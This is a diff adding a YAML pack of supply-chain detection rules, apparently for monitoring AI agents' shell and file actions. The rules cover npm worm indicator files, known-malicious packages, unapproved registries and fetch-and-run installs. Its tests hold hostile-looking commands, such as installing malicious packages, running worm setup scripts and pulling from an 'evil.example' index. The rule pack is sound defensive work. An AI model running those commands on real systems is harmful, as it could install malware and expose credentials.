@@ -1,0 +1,204 @@
+# Supply chain: worm indicators, malicious and unexpected package sources.
+# The OS-plane chain (a package lifecycle script launching an agent) is in
+# the process pack; repository auto-run plants found at rest are posture.
+pack: supply-chain
+version: "2026.11.0"
+description: Worm indicators, malicious packages, unexpected registries and fetch-and-run installs.
+rules:
+  - id: SPR-SUPPLY-001
+    title: Worm indicator file or name
+    description: >-
+      A file or name from the 2025-2026 npm worm campaigns is written, run
+      or used: .github/setup.js, setup_bun.js, bun_environment.js,
+      ~/.config/index.js, /tmp/inventory.txt, a public repository named
+      s1ngularity-repository or a runner named SHA1HULUD.
+    kind: activity
+    class: alert
+    severity: critical
+    confidence: high
+    maturity: stable
+    category: supply_chain
+    tags: [attack.t1195.002, atlas.aml.t0010.005, owasp.asi04]
+    references:
+      - "research/threats.md section 2 row 1: Nx s1ngularity (/tmp/inventory.txt, s1ngularity-repository)"
+      - "research/threats.md section 2 row 26: Shai-Hulud (setup_bun.js, bun_environment.js, SHA1HULUD)"
+      - "research/threats.md section 2 row 29: Miasma (.github/setup.js, ~/.config/index.js)"
+      - "research/threats.md section 3 R54"
+    falsepositives:
+      - "Incident responders reproducing the worm in a lab"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      any:
+        - all:
+            - tool.kind|in: [file_write, file_edit, file_read]
+            - target.path|re: "(?i)([/\\\\]\\.github[/\\\\]setup\\.js|setup_bun\\.js|bun_environment\\.js|[/\\\\]\\.config[/\\\\]index\\.js|[/\\\\]inventory\\.txt(\\.bak)?)$"
+        - shell.writes|any_re: "(?i)([/\\\\]\\.github[/\\\\]setup\\.js|setup_bun\\.js|bun_environment\\.js|[/\\\\]\\.config[/\\\\]index\\.js|/tmp/inventory\\.txt(\\.bak)?)$"
+        - shell.executes_paths|any_re: "(?i)(\\.github[/\\\\]setup\\.js|setup_bun\\.js|bun_environment\\.js|\\.config[/\\\\]index\\.js)$"
+        - shell.argv|any_re: "(?i)(\\.github/setup\\.js|setup_bun\\.js|bun_environment\\.js|s1ngularity-repository|sha1-?hulud)"
+    evidence: [target.path, target.command]
+    escalate: true
+    remedy: Isolate the host, rotate every credential the user holds and check which packages ran install scripts.
+    tests:
+      - name: node runs .github/setup.js
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "node .github/setup.js" } }
+        expect: match
+      - name: setup.js written by a tool
+        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/project/.github/setup.js } }
+        expect: match
+      - name: public repository with the IOC name
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "gh repo create s1ngularity-repository-0 --public" } }
+        expect: match
+      - name: ordinary workflow file
+        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/project/.github/workflows/ci.yml } }
+        expect: no_match
+      - name: project setup script
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "node scripts/setup.js" } }
+        expect: no_match
+
+  - id: SPR-SUPPLY-002
+    title: Package from an incident report installed
+    description: >-
+      An install names a package listed in malicious_packages (seeded from
+      research/threats.md; extend it from OSV MAL-* or OpenSSF
+      malicious-packages through a bundle).
+    kind: activity
+    class: alert
+    severity: critical
+    confidence: high
+    maturity: stable
+    category: supply_chain
+    tags: [attack.t1195.002, attack.t1204.005, owasp.asi04]
+    references:
+      - "research/threats.md section 2 row 33: AGENTS.md tells Codex to install function-color"
+      - "research/threats.md section 2 row 35: postmark-mcp 1.0.16"
+      - "research/threats.md section 3 R33"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      any_install:
+        packages|any_in_list: malicious_packages
+    evidence: [target.command, shell.installs]
+    remedy: Remove the package, rotate credentials the install script could reach and report the package.
+    tests:
+      - name: function-color
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm install function-color" } }
+        expect: match
+      - name: malicious postmark-mcp version
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm i postmark-mcp@1.0.16" } }
+        expect: match
+      - name: earlier postmark-mcp version
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm i postmark-mcp@1.0.15" } }
+        expect: no_match
+      - name: ordinary package
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm install lodash" } }
+        expect: no_match
+
+  - id: SPR-SUPPLY-003
+    title: Install from an unapproved registry or index
+    description: >-
+      An install names its own registry or index (--registry, --index-url,
+      --extra-index-url) that is not on approved_package_indexes. Package
+      names then resolve against a host the organisation does not control,
+      which is dependency confusion's mechanism.
+    kind: activity
+    class: finding
+    severity: medium
+    confidence: medium
+    maturity: stable
+    category: supply_chain
+    tags: [attack.t1195.001, owasp.asi04]
+    references:
+      - "research/threats.md section 3 R33"
+    falsepositives:
+      - "The organisation's own mirror not yet listed"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      any_install:
+        flags|any_re: "(?i)^--?(registry|index-url|extra-index-url|index|default-index|i)="
+    allow:
+      shell.install_sources|in_list: approved_package_indexes
+    dedup: [shell.install_sources]
+    evidence: [target.command, shell.install_sources]
+    remedy: Use the organisation's registry; add it to approved_package_indexes if it is one.
+    tests:
+      - name: pip with a foreign index
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install --index-url https://evil.example/simple requests" } }
+        expect: match
+      - name: npm with a foreign registry
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm install --registry https://npm.evil.example lodash" } }
+        expect: match
+      - name: pytorch wheel index
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install --extra-index-url https://download.pytorch.org/whl/cu121 torch" } }
+        expect: no_match
+      - name: plain install
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install requests" } }
+        expect: no_match
+
+  - id: SPR-SUPPLY-004
+    title: Package installed straight from a URL or git repository
+    description: >-
+      An install takes its package from a URL or a git repository instead
+      of a registry. Common for unreleased fixes, so a signal; it bypasses
+      registry malware scanning and version pinning.
+    kind: activity
+    class: signal
+    severity: low
+    confidence: medium
+    maturity: stable
+    category: supply_chain
+    tags: [attack.t1195.001, owasp.asi04]
+    references:
+      - "research/threats.md section 3 R33"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      any_install:
+        packages|any_re: "^(git\\+|https?://|git@|github:|gitlab:)"
+    dedup: [shell.install_sources]
+    evidence: [target.command, shell.install_sources]
+    remedy: No action on its own; pin a commit when a git source is needed.
+    tests:
+      - name: pip from git
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install git+https://github.com/x/y" } }
+        expect: match
+      - name: registry install
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install 'requests>=2'" } }
+        expect: no_match
+      - name: local editable install
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install -e ." } }
+        expect: no_match
+
+  - id: SPR-SUPPLY-005
+    title: Package fetched and run in one step
+    description: >-
+      npx, uvx, bunx or pipx run downloads the latest release of a package
+      and runs it immediately. This is how most MCP servers start, so it is a
+      signal: every run executes whatever was published last.
+    kind: activity
+    class: signal
+    severity: info
+    confidence: high
+    maturity: stable
+    category: supply_chain
+    tags: [attack.t1195.002, owasp.asi04]
+    references:
+      - "research/threats.md section 6 (npx -y MCP servers are the ecosystem default)"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      shell.install_exec: true
+    dedup: [shell.installs]
+    evidence: [shell.installs]
+    remedy: No action on its own; pin versions for anything run regularly.
+    tests:
+      - name: npx -y
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npx -y @modelcontextprotocol/server-filesystem /tmp" } }
+        expect: match
+      - name: npm ci
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm ci" } }
+        expect: no_match
+      - name: local binary
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "./node_modules/.bin/tsc -p ." } }
+        expect: no_match
